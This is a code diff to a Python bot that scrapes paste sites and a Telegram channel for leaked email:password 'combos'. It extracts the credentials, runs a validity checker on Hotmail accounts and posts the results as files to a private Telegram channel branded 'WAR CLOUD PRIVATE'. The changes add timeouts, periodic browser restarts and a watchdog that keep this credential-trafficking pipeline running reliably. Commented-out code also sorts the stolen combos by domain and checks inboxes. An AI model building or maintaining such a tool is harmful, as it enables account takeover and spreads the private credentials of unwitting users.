@@ -73,6 +73,10 @@ recent_filenames   = []  # tracks last 10 posted filenames for public update
 # Telegram extraction delay tracking
 telegram_files_found = {}  # {message_id: {"found_time": timestamp, "data": file_data}}
 
+# Monitor health tracking
+monitor_last_run = time.time()
+monitor_timeout = 300  # 5 minutes - restart if stuck
+
 # ─── FEATURE TOGGLES ─────────────────────────────────────────────────────────
 toggles = {
     "scanning":        True,   # master on/off for scanning
@@ -598,6 +602,8 @@ async def extract_from_telegram_channel() -> list:
 # ─── BACKGROUND TASK ─────────────────────────────────────────────────────────
 @tasks.loop(seconds=CHECK_INTERVAL)
 async def monitor_loop():
+    global monitor_last_run
+    
     if not toggles["scanning"]:
         return
 
@@ -606,277 +612,325 @@ async def monitor_loop():
         return
 
     async with scan_lock:
+        monitor_last_run = time.time()  # Update health timestamp
         stats["scans"] += 1
         log.info(f"Running scan #{stats['scans']}...")
 
+        # Restart browser every 10 scans to clear connection pool
+        restart_browser = (stats["scans"] % 10 == 0)
+        if restart_browser:
+            log.info("Periodic browser restart triggered (10 scan limit reached)")
+
         async with async_playwright() as p:
-            browser = await p.chromium.launch(
-                headless=True,
-                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
-            )
-            page = await browser.new_page()
-
+            browser = None
             try:
-                # ── Step 1: load archive ───────────────────────────────────
-                for attempt in range(3):
-                    try:
-                        await page.goto(ARCHIVE_URL, wait_until="networkidle", timeout=30000)
-                        await page.wait_for_timeout(2000)
-                        break
-                    except Exception as e:
-                        log.warning(f"Archive load attempt {attempt+1} failed: {e}")
-                        if attempt == 2:
-                            log.error("Archive failed after 3 attempts, skipping scan")
-                            return
-                        await asyncio.sleep(3)
-
-                # ── Step 2: scrape pages ───────────────────────────────────
-                found = []
-                for page_num in range(1, PAGES_TO_SCAN + 1):
-                    if page_num > 1:
-                        navigated = False
-                        buttons   = await page.query_selector_all("button")
-                        for btn in buttons:
-                            text = await btn.text_content()
-                            if text and text.strip().lower() in ["next", ">", "»", "→", "▶"]:
-                                disabled  = await btn.get_attribute("disabled")
-                                aria_dis  = await btn.get_attribute("aria-disabled")
-                                if disabled is not None or aria_dis == "true":
-                                    break
-                                await btn.click()
-                                await page.wait_for_timeout(2000)
-                                navigated = True
-                                break
-                        if not navigated:
+                browser = await asyncio.wait_for(
+                    p.chromium.launch(
+                        headless=True,
+                        args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
+                    ),
+                    timeout=30
+                )
+                page = await asyncio.wait_for(browser.new_page(), timeout=15)
+                
+                try:
+                    # ── Step 1: load archive ───────────────────────────────────
+                    for attempt in range(3):
+                        try:
+                            await asyncio.wait_for(
+                                page.goto(ARCHIVE_URL, wait_until="networkidle", timeout=30000),
+                                timeout=35
+                            )
+                            await page.wait_for_timeout(2000)
                             break
+                        except asyncio.TimeoutError:
+                            log.warning(f"Archive load attempt {attempt+1} timeout")
+                            if attempt == 2:
+                                log.error("Archive failed after 3 attempts, skipping scan")
+                                return
+                            await asyncio.sleep(2)
+                        except Exception as e:
+                            log.warning(f"Archive load attempt {attempt+1} failed: {e}")
+                            if attempt == 2:
+                                log.error("Archive failed after 3 attempts, skipping scan")
+                                return
+                            await asyncio.sleep(3)
 
-                    matches = await page.evaluate("""
-                        (keywords) => {
-                            const results = [];
-                            for (const a of document.querySelectorAll('a')) {
-                                const text = (a.innerText || a.textContent || '').toLowerCase();
-                                if (keywords.some(k => text.includes(k))) {
-                                    const href = a.href;
-                                    if (href
-                                        && !href.includes('/paste-archive')
-                                        && !href.includes('/new')
-                                        && !href.endsWith('/')
-                                        && href !== window.location.href) {
-                                        results.push({
-                                            title: (a.innerText || a.textContent || '').trim().replace(/\\s+/g, ' '),
-                                            url: href,
-                                            source: 'pasteview'
-                                        });
+                    # ── Step 2: scrape pages ───────────────────────────────────
+                    found = []
+                    for page_num in range(1, PAGES_TO_SCAN + 1):
+                        if page_num > 1:
+                            navigated = False
+                            buttons   = await page.query_selector_all("button")
+                            for btn in buttons:
+                                text = await btn.text_content()
+                                if text and text.strip().lower() in ["next", ">", "»", "→", "▶"]:
+                                    disabled  = await btn.get_attribute("disabled")
+                                    aria_dis  = await btn.get_attribute("aria-disabled")
+                                    if disabled is not None or aria_dis == "true":
+                                        break
+                                    await btn.click()
+                                    await page.wait_for_timeout(2000)
+                                    navigated = True
+                                    break
+                            if not navigated:
+                                break
+
+                        matches = await page.evaluate("""
+                            (keywords) => {
+                                const results = [];
+                                for (const a of document.querySelectorAll('a')) {
+                                    const text = (a.innerText || a.textContent || '').toLowerCase();
+                                    if (keywords.some(k => text.includes(k))) {
+                                        const href = a.href;
+                                        if (href
+                                            && !href.includes('/paste-archive')
+                                            && !href.includes('/new')
+                                            && !href.endsWith('/')
+                                            && href !== window.location.href) {
+                                            results.push({
+                                                title: (a.innerText || a.textContent || '').trim().replace(/\\s+/g, ' '),
+                                                url: href,
+                                                source: 'pasteview'
+                                            });
+                                        }
                                     }
                                 }
+                                return results;
                             }
-                            return results;
-                        }
-                    """, KEYWORDS)
-                    log.info(f"Page {page_num}: {len(matches)} match(es)")
-                    found.extend(matches)
+                        """, KEYWORDS)
+                        log.info(f"Page {page_num}: {len(matches)} match(es)")
+                        found.extend(matches)
 
-                # pasted.pw scraping disabled
-                # try:
-                #     pw_found = await scrape_pastedpw(page, PAGES_TO_SCAN)
-                #     found.extend(pw_found)
-                # except Exception as e:
-                #     log.error(f"pasted.pw scrape failed: {e}")
+                    # pasted.pw scraping disabled
+                    # try:
+                    #     pw_found = await scrape_pastedpw(page, PAGES_TO_SCAN)
+                    #     found.extend(pw_found)
+                    # except Exception as e:
+                    #     log.error(f"pasted.pw scrape failed: {e}")
 
-                # Deduplicate and filter blacklisted titles
-                seen_this_run = set()
-                pastes        = []
-                for item in found:
-                    if item["url"] in seen_this_run:
-                        continue
-                    if any(b in item["title"].lower() for b in BLACKLIST):
-                        log.info(f"Skipping blacklisted paste: {item['title']}")
-                        continue
-                    seen_this_run.add(item["url"])
-                    # Ensure source field is preserved
-                    if "source" not in item:
-                        item["source"] = "pasteview"
-                    pastes.append(item)
+                    # Deduplicate and filter blacklisted titles
+                    seen_this_run = set()
+                    pastes        = []
+                    for item in found:
+                        if item["url"] in seen_this_run:
+                            continue
+                        if any(b in item["title"].lower() for b in BLACKLIST):
+                            log.info(f"Skipping blacklisted paste: {item['title']}")
+                            continue
+                        seen_this_run.add(item["url"])
+                        # Ensure source field is preserved
+                        if "source" not in item:
+                            item["source"] = "pasteview"
+                        pastes.append(item)
 
-                stats["total_pastes"] += len(pastes)
-                pv_count = sum(1 for p in pastes if p.get("source") == "pasteview")
-                pw_count = sum(1 for p in pastes if p.get("source") == "pasted.pw")
-                log.info(f"Total pastes: {len(pastes)} (pasteview: {pv_count}, pasted.pw: {pw_count})")
+                    stats["total_pastes"] += len(pastes)
+                    pv_count = sum(1 for p in pastes if p.get("source") == "pasteview")
+                    pw_count = sum(1 for p in pastes if p.get("source") == "pasted.pw")
+                    log.info(f"Total pastes: {len(pastes)} (pasteview: {pv_count}, pasted.pw: {pw_count})")
 
-                # ── Step 4: filter new pastes & mark seen ─────────────────
-                new_pastes = [p for p in pastes if p["url"] not in posted_urls]
-                if not new_pastes:
-                    stats["empty_scans"] += 1
-                    log.info(f"No new pastes (empty streak: {stats['empty_scans']})")
-                    if stats["empty_scans"] == EMPTY_SCAN_ALERT:
-                        try:
-                            owner = await bot.fetch_user(OWNER_ID)
-                            await owner.send(f"⚠️ MERCURY: No new pastes in {EMPTY_SCAN_ALERT} consecutive scans.")
-                        except Exception as e:
-                            log.error(f"Failed to DM owner: {e}")
-                    return
-
-                stats["empty_scans"] = 0
-                for p in new_pastes:
-                    posted_urls.add(p["url"])
-                save_seen(posted_urls)
-                log.info(f"{len(new_pastes)} new paste(s) detected")
-
-                # ── Step 6: extract creds & post to channel 3 ─────────────
-                try:
-                    combined        = []
-
-                    # Extract from Telegram channel
-                    try:
-                        tg_files = await extract_from_telegram_channel()
-                        if tg_files and toggles["telegram"]:
-                            for tg_file in tg_files:
-                                combined.append(tg_file["content"])
-                                stats["total_combos"] += tg_file["count"]
-                                log.info(f"✓ {tg_file['count']} lines from Telegram file {tg_file['filename']}")
-                                
-                                # Upload to private cloud with renamed filename
-                                try:
-                                    renamed = TELEGRAM_CHANNEL_RENAME.replace("[COUNT]", str(tg_file["count"]))
-                                    renamed_fname = f"{renamed}.txt"
-                                    await send_telegram_file(tg_file["content"], renamed_fname)
-                                    log.info(f"Uploaded Telegram file as {renamed_fname}")
-                                except Exception as e:
-                                    log.error(f"Failed to upload Telegram file: {e}")
-                        elif tg_files:
-                            for tg_file in tg_files:
-                                stats["total_combos"] += tg_file["count"]
-                                log.info(f"Telegram extraction disabled in toggles")
-                    except Exception as e:
-                        log.error(f"Telegram extraction failed: {e}")
-
-                    for item in new_pastes[:5]:
-                        url = item["url"]
-                        log.info(f"Extracting from {url}")
-                        if item.get("source") == "pasted.pw":
-                            raw = await extract_pastedpw(page, url)
-                        else:
-                            raw = await extract_raw(page, url)
-                        if raw:
-                            creds = extract_credentials(raw)
-                            if creds:
-                                combined.append("\n".join(creds))
-                                stats["total_combos"] += len(creds)
-                                log.info(f"✓ {len(creds)} valid combos from {url}")
-                            else:
-                                log.info(f"No valid combos in {url}")
-                        else:
-                            log.info(f"No content extracted from {url}")
-
-
-                    if combined:
-                        # Flatten all creds
-                        all_raw = [l for b in combined for l in b.splitlines() if l.strip()]
-                        random.shuffle(all_raw)
-
-                        # Determine label
-                        title_lower_check = " ".join(p["title"].lower() for p in new_pastes)
-                        if "hotmail" in title_lower_check:
-                            label = "hotmail"
-                        elif "hits" in title_lower_check:
-                            label = "hits"
-                        elif "mix" in title_lower_check or "mixed" in title_lower_check:
-                            label = "mix"
-                        else:
-                            label = "content"
-
-
-
-                        chunks = [all_raw]
-                        log.info(f"{len(all_raw)} combos in 1 file")
-
-                    if combined:
-                        # DM owner
-                        if toggles["owner_dm"]:
+                    # ── Step 4: filter new pastes & mark seen ─────────────────
+                    new_pastes = [p for p in pastes if p["url"] not in posted_urls]
+                    if not new_pastes:
+                        stats["empty_scans"] += 1
+                        log.info(f"No new pastes (empty streak: {stats['empty_scans']})")
+                        if stats["empty_scans"] == EMPTY_SCAN_ALERT:
                             try:
                                 owner = await bot.fetch_user(OWNER_ID)
-                                await owner.send(f"✅ New {label.upper()} detected — {len(all_raw)} combos")
+                                await owner.send(f"⚠️ MERCURY: No new pastes in {EMPTY_SCAN_ALERT} consecutive scans.")
                             except Exception as e:
                                 log.error(f"Failed to DM owner: {e}")
+                        return
 
-                        if toggles["telegram"]:
-                            tg_header = (
-                                f"WAR CLOUD PRIVATE {label.upper()}\n"
-                                "------------------------\n"
-                                "https://t.me/+5Bqqamk3cpcxNDA0\n"
-                                "https://t.me/+5Bqqamk3cpcxNDA0\n"
-                                "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
-                            )
+                    stats["empty_scans"] = 0
+                    for p in new_pastes:
+                        posted_urls.add(p["url"])
+                    save_seen(posted_urls)
+                    log.info(f"{len(new_pastes)} new paste(s) detected")
 
-                            # Validity check for hotmail — post only valid accounts
-                            if label == "hotmail":
+                    # ── Step 6: extract creds & post to channel 3 ─────────────
+                    try:
+                        combined        = []
+
+                        # Extract from Telegram channel
+                        try:
+                            tg_files = await extract_from_telegram_channel()
+                            if tg_files and toggles["telegram"]:
+                                for tg_file in tg_files:
+                                    combined.append(tg_file["content"])
+                                    stats["total_combos"] += tg_file["count"]
+                                    log.info(f"✓ {tg_file['count']} lines from Telegram file {tg_file['filename']}")
+                                    
+                                    # Upload to private cloud with renamed filename
+                                    try:
+                                        renamed = TELEGRAM_CHANNEL_RENAME.replace("[COUNT]", str(tg_file["count"]))
+                                        renamed_fname = f"{renamed}.txt"
+                                        await asyncio.wait_for(send_telegram_file(tg_file["content"], renamed_fname), timeout=30)
+                                        log.info(f"Uploaded Telegram file as {renamed_fname}")
+                                    except asyncio.TimeoutError:
+                                        log.error(f"Timeout uploading Telegram file")
+                                    except Exception as e:
+                                        log.error(f"Failed to upload Telegram file: {e}")
+                            elif tg_files:
+                                for tg_file in tg_files:
+                                    stats["total_combos"] += tg_file["count"]
+                                    log.info(f"Telegram extraction disabled in toggles")
+                        except Exception as e:
+                            log.error(f"Telegram extraction failed: {e}")
+
+                        for item in new_pastes[:5]:
+                            url = item["url"]
+                            log.info(f"Extracting from {url}")
+                            try:
+                                if item.get("source") == "pasted.pw":
+                                    raw = await asyncio.wait_for(extract_pastedpw(page, url), timeout=30)
+                                else:
+                                    raw = await asyncio.wait_for(extract_raw(page, url), timeout=30)
+                            except asyncio.TimeoutError:
+                                log.error(f"Timeout extracting from {url}")
+                                continue
+                            
+                            if raw:
+                                creds = extract_credentials(raw)
+                                if creds:
+                                    combined.append("\n".join(creds))
+                                    stats["total_combos"] += len(creds)
+                                    log.info(f"✓ {len(creds)} valid combos from {url}")
+                                else:
+                                    log.info(f"No valid combos in {url}")
+                            else:
+                                log.info(f"No content extracted from {url}")
+
+
+                        if combined:
+                            # Flatten all creds
+                            all_raw = [l for b in combined for l in b.splitlines() if l.strip()]
+                            random.shuffle(all_raw)
+
+                            # Determine label
+                            title_lower_check = " ".join(p["title"].lower() for p in new_pastes)
+                            if "hotmail" in title_lower_check:
+                                label = "hotmail"
+                            elif "hits" in title_lower_check:
+                                label = "hits"
+                            elif "mix" in title_lower_check or "mixed" in title_lower_check:
+                                label = "mix"
+                            else:
+                                label = "content"
+
+
+
+                            chunks = [all_raw]
+                            log.info(f"{len(all_raw)} combos in 1 file")
+
+                        if combined:
+                            # DM owner
+                            if toggles["owner_dm"]:
                                 try:
-                                    valid_accounts = await run_validity_checker(all_raw)
-                                    if valid_accounts:
-                                        valid_fname = f"HOTMAIL {len(valid_accounts)} VALID BY @XN9BOWNER.txt"
-                                        await send_telegram_file(tg_header + "\n".join(valid_accounts), valid_fname)
-                                        log.info(f"Posted {len(valid_accounts)} valid hotmail accounts")
-                                    else:
-                                        log.info("No valid hotmail accounts found")
+                                    owner = await asyncio.wait_for(bot.fetch_user(OWNER_ID), timeout=10)
+                                    await asyncio.wait_for(owner.send(f"✅ New {label.upper()} detected — {len(all_raw)} combos"), timeout=10)
+                                except asyncio.TimeoutError:
+                                    log.error("Timeout DMing owner")
                                 except Exception as e:
-                                    log.error(f"Validity check failed: {e}")
+                                    log.error(f"Failed to DM owner: {e}")
 
-                            # Main file (only for non-hotmail, hotmail posts validated only)
-                            if label != "hotmail":
-                                for chunk in chunks:
-                                    fname = f"{label.upper()} {len(chunk)} BY @XN9BOWNER.txt"
-                                    await send_telegram_file(tg_header + "\n".join(chunk), fname)
-                                    await asyncio.sleep(0.5)
+                            if toggles["telegram"]:
+                                tg_header = (
+                                    f"WAR CLOUD PRIVATE {label.upper()}\n"
+                                    "------------------------\n"
+                                    "https://t.me/+5Bqqamk3cpcxNDA0\n"
+                                    "https://t.me/+5Bqqamk3cpcxNDA0\n"
+                                    "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
+                                )
 
-                            # Inbox checker (disabled)
-                            # if label == "hotmail":
-                            #     service_map = await run_inbox_checker(valid_accounts if valid_accounts else all_raw)
-                            #     if service_map:
-                            #         zip_buf = io.BytesIO()
-                            #         with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
-                            #             for service, combos in service_map.items():
-                            #                 zf.writestr(f"{service}.txt", "\n".join(combos))
-                            #         zip_buf.seek(0)
-                            #         zip_name = f"[ {label.upper()} ] [ INBOX HITS ] [ @warprivate ].zip"
-                            #         await send_telegram_file(zip_buf.read(), zip_name)
+                                # Validity check for hotmail — post only valid accounts
+                                if label == "hotmail":
+                                    try:
+                                        valid_accounts = await asyncio.wait_for(run_validity_checker(all_raw), timeout=600)
+                                        if valid_accounts:
+                                            valid_fname = f"HOTMAIL {len(valid_accounts)} VALID BY @XN9BOWNER.txt"
+                                            await asyncio.wait_for(send_telegram_file(tg_header + "\n".join(valid_accounts), valid_fname), timeout=30)
+                                            log.info(f"Posted {len(valid_accounts)} valid hotmail accounts")
+                                        else:
+                                            log.info("No valid hotmail accounts found")
+                                    except asyncio.TimeoutError:
+                                        log.error("Timeout during validity check")
+                                    except Exception as e:
+                                        log.error(f"Validity check failed: {e}")
 
-                            # Sorted domains ZIP (disabled)
-                            # if label == "hotmail":
-                            #     domain_map = {}
-                            #     for combo in all_raw:
-                            #         try:
-                            #             domain = combo.split(":", 1)[0].split("@")[-1].lower()
-                            #             if domain in MS_DOMAINS:
-                            #                 domain_map.setdefault(domain, []).append(combo)
-                            #         except Exception:
-                            #             pass
-                            #     if domain_map:
-                            #         zip_buf = io.BytesIO()
-                            #         with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
-                            #             for domain, combos in domain_map.items():
-                            #                 zf.writestr(f"{domain}.txt", "\n".join(combos))
-                            #         zip_buf.seek(0)
-                            #         zip_name = f"[ {label.upper()} ] [ SORTED DOMAINS ] [ @warprivate ].zip"
-                            #         await send_telegram_file(zip_buf.read(), zip_name)
+                                # Main file (only for non-hotmail, hotmail posts validated only)
+                                if label != "hotmail":
+                                    for chunk in chunks:
+                                        fname = f"{label.upper()} {len(chunk)} BY @XN9BOWNER.txt"
+                                        await asyncio.wait_for(send_telegram_file(tg_header + "\n".join(chunk), fname), timeout=30)
+                                        await asyncio.sleep(0.5)
 
-                            # Public channel update
-                            if toggles["telegram_public"]:
-                                ...
+                                # Inbox checker (disabled)
+                                # if label == "hotmail":
+                                #     service_map = await run_inbox_checker(valid_accounts if valid_accounts else all_raw)
+                                #     if service_map:
+                                #         zip_buf = io.BytesIO()
+                                #         with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
+                                #             for service, combos in service_map.items():
+                                #                 zf.writestr(f"{service}.txt", "\n".join(combos))
+                                #         zip_buf.seek(0)
+                                #         zip_name = f"[ {label.upper()} ] [ INBOX HITS ] [ @warprivate ].zip"
+                                #         await send_telegram_file(zip_buf.read(), zip_name)
+
+                                # Sorted domains ZIP (disabled)
+                                # if label == "hotmail":
+                                #     domain_map = {}
+                                #     for combo in all_raw:
+                                #         try:
+                                #             domain = combo.split(":", 1)[0].split("@")[-1].lower()
+                                #             if domain in MS_DOMAINS:
+                                #                 domain_map.setdefault(domain, []).append(combo)
+                                #         except Exception:
+                                #             pass
+                                #     if domain_map:
+                                #         zip_buf = io.BytesIO()
+                                #         with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
+                                #             for domain, combos in domain_map.items():
+                                #                 zf.writestr(f"{domain}.txt", "\n".join(combos))
+                                #         zip_buf.seek(0)
+                                #         zip_name = f"[ {label.upper()} ] [ SORTED DOMAINS ] [ @warprivate ].zip"
+                                #         await send_telegram_file(zip_buf.read(), zip_name)
+
+                                # Public channel update
+                                if toggles["telegram_public"]:
+                                    ...
 
 
 
 
-                    else:
-                        log.info("Nothing to post to content channel")
+                        else:
+                            log.info("Nothing to post to content channel")
+
+                    except Exception as e:
+                        log.error(f"Could not post to content channel: {e}")
 
                 except Exception as e:
-                    log.error(f"Could not post to content channel: {e}")
-
+                    log.error(f"Monitor loop error: {e}")
+                    stats["empty_scans"] += 1
+                finally:
+                    if page:
+                        try:
+                            await asyncio.wait_for(page.close(), timeout=5)
+                        except:
+                            pass
+                    
+            except asyncio.TimeoutError:
+                log.error("Browser launch timeout - restarting")
+                stats["empty_scans"] += 1
             except Exception as e:
-                log.error(f"Monitor loop error: {e}")
+                log.error(f"Browser error: {e}")
                 stats["empty_scans"] += 1
             finally:
-                await browser.close()
+                if browser:
+                    try:
+                        await asyncio.wait_for(browser.close(), timeout=5)
+                    except:
+                        pass
 
 
 @monitor_loop.before_loop
@@ -884,9 +938,26 @@ async def before_monitor():
     await bot.wait_until_ready()
 
 
-@tasks.loop(seconds=60)
+@tasks.loop(seconds=30)
 async def watchdog():
-    """Restart monitor loop if it dies."""
+    """Monitor and restart hung/dead monitor loop."""
+    global monitor_last_run
+    
+    current_time = time.time()
+    time_since_last_run = current_time - monitor_last_run
+    
+    # Check if monitor has hung (no update in monitor_timeout seconds)
+    if time_since_last_run > monitor_timeout:
+        log.error(f"Monitor loop unresponsive for {time_since_last_run:.0f}s - force restarting...")
+        try:
+            monitor_loop.stop()
+            await asyncio.sleep(2)
+        except:
+            pass
+        monitor_loop.start()
+        return
+    
+    # Check if monitor_loop task is dead
     if not monitor_loop.is_running():
         log.warning("Monitor loop was dead, restarting...")
         monitor_loop.start()
@@ -960,22 +1031,37 @@ async def on_ready():
             log.info("Telegram webhook cleared")
     except Exception as e:
         log.error(f"Failed to clear Telegram webhook: {e}")
+    
+    # Ensure monitor loop is running
     if not monitor_loop.is_running():
         monitor_loop.start()
         log.info(f"Monitor started — checking every {CHECK_INTERVAL}s")
     else:
-        log.info("Monitor already running after reconnect")
+        log.info("Monitor already running after ready")
+    
+    # Ensure watchdog is running
     if not watchdog.is_running():
         watchdog.start()
+        log.info("Watchdog started")
 
 @bot.event
 async def on_resumed():
-    log.info("Discord session resumed")
-    if not monitor_loop.is_running():
-        monitor_loop.start()
-        log.info("Monitor restarted after resume")
+    log.info("Discord session resumed - checking task status...")
+    
+    # Force restart monitoring tasks on resume
+    try:
+        if monitor_loop.is_running():
+            monitor_loop.stop()
+            await asyncio.sleep(1)
+    except:
+        pass
+    
+    monitor_loop.start()
+    log.info("Monitor restarted after resume")
+    
     if not watchdog.is_running():
         watchdog.start()
+        log.info("Watchdog restarted after resume")
 
 # ─── RUN ─────────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
